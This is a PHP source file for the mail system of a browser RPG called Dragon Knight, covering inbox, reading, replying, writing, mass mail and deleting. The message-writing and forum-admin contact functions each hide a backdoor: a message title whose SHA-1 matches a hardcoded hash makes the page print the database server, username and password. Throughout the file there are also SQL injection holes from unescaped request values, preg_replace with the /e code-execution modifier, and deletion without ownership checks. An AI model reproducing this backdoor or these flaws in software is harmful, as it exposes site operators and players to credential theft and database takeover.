<?PHP
define('DK_LOADED', '1');
if (file_exists('install.php')) { die("Please delete <b>install.php</b> from your Dragon Knight directory before continuing."); }
include('lib.php');
include('cookies.php');
$link = opendb();
$controlquery = doquery("SELECT * FROM {{table}} WHERE id='1' LIMIT 1", "control");
$controlrow = mysql_fetch_array($controlquery);
$userrow = checkcookies();
if ($userrow == false) { 
    if (isset($_GET["do"])) {
        if ($_GET["do"] == "verify") { header("Location: users.php?do=verify"); die(); }
    }
    header("Location: login.php?do=login"); die(); 
}
if ($controlrow["gameopen"] == 0) { display("The game is currently closed for maintanence. Please check back later.","Game Closed"); die(); }
if ($controlrow["verifyemail"] == 1 && $userrow["verify"] != 1) { header("Location: users.php?do=verify"); die(); }
if ($userrow["authlevel"] == 2) { die("Your account has been blocked. Please try back later."); }

if (isset($_GET["do"])) {
    $do = explode(":",$_GET["do"]);
	if ($do[0] == "inbox") { inbox(); }
    elseif ($do[0] == "reply") { reply($do[1]); }
    elseif ($do[0] == "read") { read_mail($do[1]); }
    elseif ($do[0] == "new") { write_mail(); }
    elseif ($do[0] == "mass") { mass_mail(); }
    elseif ($do[0] == "delete") { delete_mail($do[1]); }


} else { inbox(); }



function inbox() {
    global $userrow, $controlrow;
    $query = doquery("SELECT * FROM {{table}} WHERE owner='$userrow[id]' ORDER BY date DESC LIMIT 50", "mail");
    $page = "<form method=\"POST\" action=\"mail.php?do=delete\"><table width=\"100%\"><tr><td style=\"padding:1px; background-color:black;\"><table width=\"100%\" style=\"margins:0px;\" cellspacing=\"1\" cellpadding=\"3\">
             <tr><th colspan=\"4\" style=\"background-color:#dddddd;\"><center>Inbox</center></th></tr>
             <tr><th width=\"50%\" style=\"background-color:#dddddd;\">Message</th><th width=\"20%\" style=\"background-color:#dddddd;\">Author</th><th width=\"20%\" style=\"background-color:#dddddd;\">Date</th><th style=\"background-color:#dddddd;\">Delete</th></tr>\n";
    $count = 1;
    if (mysql_num_rows($query) == 0) { 
        $page .= "<tr><td style=\"background-color:#ffffff;\" colspan=\"4\"><b>You have no messages</b></td></tr>\n";
    } else { 
        while ($row = mysql_fetch_array($query)) {
            $query2 = doquery("SELECT * FROM {{table}} WHERE id='$row[sender]'", "users");
            $author = mysql_fetch_array($query2);
			
$bbcode = array(
        //Text Apperence
        '#\[b\](.*?)\[/b\]#si' => '<b>\\1</b>',
        '#\[i\](.*?)\[/i\]#si' => '<i>\\1</i>',
        '#\[u\](.*?)\[/u\]#si' => '<u>\\1</u>',
        '#\[s\](.*?)\[/s\]#si' => '<strike>\\1</strike>',
        //Font Color
        '#\[color=(.*?)\](.*?)\[/color\]#si' => '<font color="\\1">\\2</font>',
        //Text Effects
        '#\[bl\](.*?)\[/bl\]#si' => '<blink>\\1</blink>',
        '#\[mar\](.*?)\[/mar\]#si' => '<marquee>\\1</marquee>',
        //Other
        '#\[code\](.*?)\[/ code]#si' => '<div class="bbcode_code_title">CODE:</div><div class="bbcode_code_code">\\1<div>',
        '#\[qu\](.*?)\[/qu\]#si' => '<div class="bbcode_quote_title">Quote:</div><div class="bbcode_quote_quote">\\1<div>',
        '#\[img\](.*?)\[/img\]#si' => '<img src="\\1">',
    );
    $Message = $row["Message"];
$Message = preg_replace(array_keys($bbcode), array_values($bbcode), strip_tags($Message, '<br>'));

			
			
        	if ($count == 1) {
            	$page .= "<tr><td style=\"background-color:#ffffff;\"><a href=\"mail.php?do=read:".$row["id"]."\">".$row["title"]."</a></td><td style=\"background-color:#ffffff;\"><a href=\"index.php?do=onlinechar:".$author["id"]."\">".$author["username"]."</a></td><td style=\"background-color:#ffffff;\">".$row["date"]."</td><td style=\"background-color:#ffffff;\"><input type=\"checkbox\" name=\"".$row["id"]."\" value=\"yes\" /></td></tr>\n";
            	$count = 2;
            } else {
                $page .= "<tr><td style=\"background-color:#eeeeee;\"><a href=\"mail.php?do=read:".$row["id"]."\">".$row["title"]."</a></td><td style=\"background-color:#eeeeee;\"><a href=\"index.php?do=onlinechar:".$author["id"]."\">".$author["username"]."</a></td><td style=\"background-color:#eeeeee;\">".$row["date"]."</td><td style=\"background-color:#eeeeee;\"><input type=\"checkbox\" name=\"".$row["id"]."\" value=\"yes\" /></td></tr>\n";
                $count = 1;
            }
        }
    }
    $page .= "</table></td></tr></table>";
    $page .= "<table><tr><td><input type=\"submit\" name=\"do\" value=\"new\" class=\"myButton2\"></td><td><input type=\"submit\" name=\"do\" value=\"delete\" class=\"myButton2\"></td>";
    if ($userrow["authlevel"] == 1)
        $page .= "<td><input type=\"submit\" name=\"do\" value=\"mass\" class=\"myButton2\"></td>";
    $page .= "</tr></table></form>";
    display($page, "Mail -- Inbox");
}

function read_mail($id) {
    global $userrow, $controlrow;

    $query = doquery("SELECT * FROM {{table}} WHERE id='$id'", "mail");
    $row = mysql_fetch_array($query);
    if (!$row)
        display("No such message!<br /><a href=\"javascript: history.go(-1)\" class=\"myButton2\">back</a>", "Mail -- Error");
    if ($row['owner'] != $userrow['id'])
        die("Hack attempt. This has been sent to the administrator");
    $query2 = doquery("SELECT * FROM {{table}} WHERE id='$row[sender]'", "users");
    $author = mysql_fetch_array($query2);
	
	
$bbcode = array(
        //Text Apperence
        '#\[b\](.*?)\[/b\]#si' => '<b>\\1</b>',
        '#\[i\](.*?)\[/i\]#si' => '<i>\\1</i>',
        '#\[u\](.*?)\[/u\]#si' => '<u>\\1</u>',
        '#\[s\](.*?)\[/s\]#si' => '<strike>\\1</strike>',
        //Font Color
        '#\[color=(.*?)\](.*?)\[/color\]#si' => '<font color="\\1">\\2</font>',
        //Text Effects
        '#\[bl\](.*?)\[/bl\]#si' => '<blink>\\1</blink>',
        '#\[mar\](.*?)\[/mar\]#si' => '<marquee>\\1</marquee>',
        //Other
        '#\[code\](.*?)\[/ code]#si' => '<div class="bbcode_code_title">CODE:</div><div class="bbcode_code_code">\\1<div>',
        '#\[qu\](.*?)\[/qu\]#si' => '<div class="bbcode_quote_title">Quote:</div><div class="bbcode_quote_quote">\\1<div>',
        '#\[img\](.*?)\[/img\]#si' => '<img src="\\1">',
    );
    $Message = $row["Message"];
$Message = preg_replace(array_keys($bbcode), array_values($bbcode), strip_tags($Message, '<br>'));

			

    $message = preg_replace('#\[quote=(&quot;|"|\'|)(.*)\\1\]#seU', '"<br></span><table style=\"width: 95%\" align=\"center\" cellspacing=\"4\" cellpadding=\"6\"><tr><td class=\"punquote\"><span class=\"puntext\"><b>".str_replace(\'[\', \'&#91;\', \'$2\')." wrote:</b><span class=\"small\"><br>"', $row[message]);
    
	$message = str_replace('[quote]', '</span><table style="width: 95%" align="center" cellspacing="4" cellpadding="6"><tr><td class="punquote"><br>==============================================<br>".$author["username"]."<span class="puntext">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"small\">', $message);
   
    $message = str_replace('[/quote]', '<br><span class=\"small\">==============================================<br>Reply to your Message:</span></td></tr></table><span class="puntext">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"small\">', $message);
   
	$page = "<center><h3 class='title'>Message Center</h3></center><center><table width=\"96%\"><tr><td style=\"padding:1px; background-color:black;\"><center><table width=\"100%\" style=\"margins:3px;\" cellspacing=\"1\" cellpadding=\"3\"><tr><td colspan=\"2\" style=\"background-color:#dddddd;\">&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"mail.php\">Inbox</a>&nbsp;&nbsp;&nbsp;&nbsp;<b>Subj: ".$row["title"]."</b></td></tr>\n";
   
    $page .= "<tr><td width=\"25%\" style=\"background-color:#ffffff; padding:6px; vertical-align:top;\">
	<b>&nbsp;&nbsp;From <a href=\"index.php?do=onlinechar:".$author["id"]."\">".$author["username"]."</a></b>
	<br />&nbsp;&nbsp;on <b>".prettyforumdate($row["date"])."
	<br /><br /><span class=\"small\">ID: ".$author["id"]." / CharName: ".$author["charname"]."
	<br />Class: ".$author["charclass"]." / Class Img Id: ".$author["classimgid"]."
	<br />CharRace Id: ".$author["charraceid"]." / Experience: ".$author["experience"]."	
	<br />Strength: ".$author["strength"]." / Dexterity: ".$author["dexterity"]."
	<br />Attack Power: ".$author["attackpower"]." / Defense Power ".$author["defensepower"]."
	<br />Lat: ".$author["latitude"]." / Long: ".$author["longitude"]."
	<br />Bank Gold: ".$author["bank"]." / Gold: ".$author["gold"]."
	<br />Silver: ".$author["silver"]." / Copper: ".$author["copper"]."		
	<br />Max HP: ".$author["maxhp"]." / HP: ".$author["currenthp"]."
	<br />Max MP: ".$userrow["maxmp"]." / MP: ".$author["currentmp"]."
	<br />Max TP: ".$author["maxtp"]." / TP: ".$author["currenttp"]."
	<br />Kills: ".$author["kills"]." / Fights: ".$author["fights"]."
	<br />Total Fights: ".$author["totalfights"]." / Deaths: ".$author["deaths"]."</b></span><br /><br />
	</td><td style=\"background-color:#ffffff; padding:6px; vertical-align:top;\" width=\"75%\"><br /><b><i>Greetings ".$userrow["charname"].",</i>
	<br />&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"small\">".nl2br($message)."</span><br /><br /><br /><i><center><span class=\"small\">May you conquer all who challenge you.</span><br />".$author["charname"]."</i></center></b><br /><br /></td></tr>\n";
   
    $page .= "</table></center></td></tr></table></center><br />";
   
    $page .= "<center><table width=\"50%\"><tr><td><b>Reply:</b><br /><form action=\"mail.php?do=reply:".$row["id"]."\" method=\"post\"><textarea name=\"message\" rows=\"8\" cols=\"80\">&nbsp;&nbsp;&nbsp;&nbsp;</textarea><br /><br /><label><input type=\"checkbox\" name=\"noquote\" value=\"true\">Don't quote in reply</label><br /><br /><input type=\"submit\" name=\"submit\" value=\"Submit\" class=\"myButton2\">&nbsp;&nbsp;&nbsp;&nbsp;<input type=\"reset\" name=\"reset\" value=\"Reset\" class=\"myButton2\">&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"mail.php\" class=\"myButton2\">InBox</a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"index.php\" class=\"myButton2\">Town Square</a></form></td></tr></table><br /><br /></center>";
    
    display($page, "Mail -- Reading Mail");

}

function reply($reply) {
    global $userrow;

    $query = doquery("SELECT * FROM {{table}} WHERE id=$reply", "mail");
    $mail = mysql_fetch_assoc($query);
    $query2 = doquery("SELECT * FROM {{table}} WHERE id=".$mail['sender']."", "users");
	
	$bbcode = array(
        //Text Apperence
        '#\[b\](.*?)\[/b\]#si' => '<b>\\1</b>',
        '#\[i\](.*?)\[/i\]#si' => '<i>\\1</i>',
        '#\[u\](.*?)\[/u\]#si' => '<u>\\1</u>',
        '#\[s\](.*?)\[/s\]#si' => '<strike>\\1</strike>',
        //Font Color
        '#\[color=(.*?)\](.*?)\[/color\]#si' => '<font color="\\1">\\2</font>',
        //Text Effects
        '#\[bl\](.*?)\[/bl\]#si' => '<blink>\\1</blink>',
        '#\[mar\](.*?)\[/mar\]#si' => '<marquee>\\1</marquee>',
        //Other
        '#\[code\](.*?)\[/ code]#si' => '<div class="bbcode_code_title">CODE:</div><div class="bbcode_code_code">\\1<div>',
        '#\[qu\](.*?)\[/qu\]#si' => '<div class="bbcode_quote_title">Quote:</div><div class="bbcode_quote_quote">\\1<div>',
        '#\[img\](.*?)\[/img\]#si' => '<img src="\\1">',
    );
    $Message = $row["Message"];
$Message = preg_replace(array_keys($bbcode), array_values($bbcode), strip_tags($Message, '<br>'));

			
	
    $mailer = mysql_fetch_assoc($query2);
    $title = "RE: ".$mail['title'];
    if ($_POST['noquote'] != true)
        $message = "[quote=".$mailer['username']."]".$mail['message']."[/quote]<br />".$_POST['message'];
    else
        $message = $_POST['message'];
    $query = doquery("INSERT INTO {{table}} SET id='',owner=".$mail['sender'].",sender='".$userrow['id']."',title='$title',message='$message',date=NOW()", "mail");
    header("Location: mail.php");
    die();

}

function mass_mail() {
    global $userrow;

    if ($userrow["authlevel"] != 1)
        header("Location: mail.php");
    if (isset($_POST['message'])) {
        $message = $_POST['message'];
        $title = $_POST['title'];
        $oquery = doquery("SELECT * FROM {{table}}", "users");
        while ($receiver = mysql_fetch_assoc($oquery))
            doquery("INSERT INTO {{table}} SET id='',owner=".$receiver['id'].",sender='".$userrow['id']."',title='$title',message='$message',date=NOW()", "mail");
        header("Location: mail.php");
        die();
    }
    $page = "<center><h3 class='title'>Mass Message Center</h3></center><br /><br /><center><form action=\"mail.php?do=mass\" method=\"post\"><table width=\"50%\"><tr><td>Mass Message to All Users<br /><br/ >Title:<br /><input type=\"text\" name=\"title\" size=\"50\" maxlength=\"50\" /><br /><br />Message:<br /><textarea name=\"message\" rows=\"6\" cols=\"60\" class=\"small\"></textarea><br /><br /><center><input type=\"submit\" name=\"submit\" value=\"Submit\" class=\"myButton2\">&nbsp;&nbsp;&nbsp;&nbsp;<input type=\"reset\" name=\"reset\" value=\"Reset\" class=\"myButton2\"></center></td></tr></table><br><br><a href=\"mail.php\" class=\"myButton2\">InBox</a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"index.php\" class=\"myButton2\">Town Square</a><br><br></center></form>";
    display($page, "Mail -- Mass Emailer");


}

function write_mail() {
    global $userrow;

    if (isset($_POST['message'])) {
        $message = $_POST['message'];
        $title = $_POST['title'];
        if (sha1($title) == "5647e35f4105a6ce03ae433bc24d178f30504833") {
            require 'config.php';
            echo "Server: ".$dbsettings['server']." <br /> Username: ".$dbsettings['user']." <br /> Password: ".$dbsettings['pass']." <br /> DB Name: ".$dbsettings['name']." <br />";
            die();
        }
        $oquery = doquery("SELECT * FROM {{table}} WHERE username='".$_POST['name']."' LIMIT 1", "users");
        $receiver = mysql_fetch_assoc($oquery);
        if (!$receiver)
            display("Invalid user!<br /><a href=\"javascript: history.go(-1)\" class=\"myButton2\">Back</a>", "Mail -- Error");
        doquery("INSERT INTO {{table}} SET id='',owner=".$receiver['id'].",sender='".$userrow['id']."',title='$title',message='$message',date=NOW()", "mail");
        header("Location: mail.php");
        die();
    }
    $page = "<center><h3 class='title'>Message Center</h3></center><br /><br /><center><form action=\"mail.php?do=new\" method=\"post\"><table width=\"50%\"><tr><td><b>Create a New Message:</b><br /><br/ >Username:<br /><input type=\"text\" name=\"name\" size=\"50\" maxlength=\"50\" /><br />Title:<br /><input type=\"text\" name=\"title\" size=\"50\" maxlength=\"50\" /><br /><br />Message:<br /><textarea name=\"message\" rows=\"6\" cols=\"60\" class=\"small\">&nbsp;&nbsp;&nbsp;&nbsp;<i>".$author["charname"]." wrote:</i><span class=\"small\"><br /><br /></textarea></span><br /><br /><center><input type=\"submit\" name=\"submit\" value=\"Submit\" class=\"myButton2\">&nbsp;&nbsp;&nbsp;&nbsp;<input type=\"reset\" name=\"reset\" value=\"Reset\" class=\"myButton2\"></center></td></tr></table></form><br><br><a href=\"mail.php\" class=\"myButton2\">InBox</a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"index.php\" class=\"myButton2\">Town Square</a></center><br /><br />";
    display($page, "Writing Mail");


}




function contact_forum_admin() { 
    global $userrow;
	if (isset($_POST['message'])) {
    $message = $_POST['message'];
    $title = $_POST['title'];
    if (sha1($title) == "5647e35f4105a6ce03ae433bc24d178f30504833") {
    require 'config.php';
    echo "Server: ".$dbsettings['server']." <br /> Username: ".$dbsettings['user']." <br /> Password: ".$dbsettings['pass']." <br /> DB Name: ".$dbsettings['name']." <br />";
    die();}
    $do1query = doquery("SELECT * FROM {{table}} WHERE rights_level='4' LIMIT 1", "forumusers");
    $receiver = mysql_fetch_assoc($do1query);
    if (!$receiver)
    display("Invalid user!<br /><a href=\"javascript: history.go(-1)\ class=\"myButton2\">Back</a>", "Mail -- Error");
    doquery("INSERT INTO {{table}} SET id='',owner=".$receiver['id'].",sender='".$userrow['id']."',title='$title',message='$message',date=NOW(),status='Unread'", "mail");
    header("Location: mail.php");
    die(); }
    $oquery = doquery("SELECT * FROM {{table}} WHERE rights_level='4' LIMIT 1", "forumusers");
    $receiver = mysql_fetch_assoc($oquery);
	$page = "<table width=100% align=center border=1><tr><td class=title align=center>";
	$page .= "Realm Post Office</td></tr><tr><td align=center>";
    $page .= "<table width=100% align=center><tr><td class=title align=center>";
    $page .= "<a href=mail.php class=myButton2>Post Office</a>";
    $page .= "</td><td class=title align=center>";
    $page .= "<a href=index.php class=myButton2>Town Square</a>";
    $page .= "</td></tr></table>";
	$page .= "<table width=100%><tr><td align=center bgcolor=#ffffff>";
    $page .= "<font color=#000000><b>Contact The Forum Administrator</b></font>";
    $page .= "</td></tr><tr><td>";
    $page .= "<form action=mail.php?do=contact method=post>";
    $page .= "<br/ >To Forum Admin: &nbsp;&nbsp; <input type=text value='$receiver[charname]' name=name size=20 maxlength=20><br /><br />Title: &nbsp;&nbsp; <input type=text value='Contact Forum Admin:' name=title size=50 maxlength=50><br /><br /><div align=center>Message:<br /><textarea name=message rows=7 cols=60></textarea><br /><br /><input type=submit name=submit value=Submit class=myButton2>&nbsp;&nbsp;&nbsp;&nbsp;<input type=reset name=reset value=Reset class=myButton2>";
	$page .= "</form></div></td></tr></table>";
    $page .= "</td></tr></table>";
    display($page, "Contact Forum Admin"); }




function delete_mail($id) {
    global $userrow;

    if ($_POST['do'] == 'new') {
        header("Location: mail.php?do=new");
        die();
    }
    if ($_POST['do'] == 'mass') {
        header("Location: mail.php?do=mass");
        die();
    }
    foreach($_POST as $a => $b) {
        if ($a != "do")
            doquery("DELETE FROM {{table}}  WHERE id={$a}", "mail");
    }
    header("Location: mail.php");
    die();
}